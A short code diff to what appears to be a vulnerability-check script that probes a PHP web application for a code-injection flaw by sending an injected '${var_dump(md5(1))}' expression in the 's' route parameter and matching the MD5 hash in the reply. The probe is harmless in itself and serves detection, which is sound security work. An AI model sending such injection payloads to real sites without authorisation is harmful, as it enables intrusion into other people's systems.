@@ -20,7 +20,7 @@ def run(url, timeout):
         'payload': None
     }
     try:
-        payload = urllib.parse.urljoin(url, '/index.php?s=a/b/c/${var_dump(md5(1))}')
+        payload = url + '/index.php?s=a/b/c/${var_dump(md5(1))}'
         response = requests.post(payload, timeout=3)
         if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
             result['vulnerable'] = True
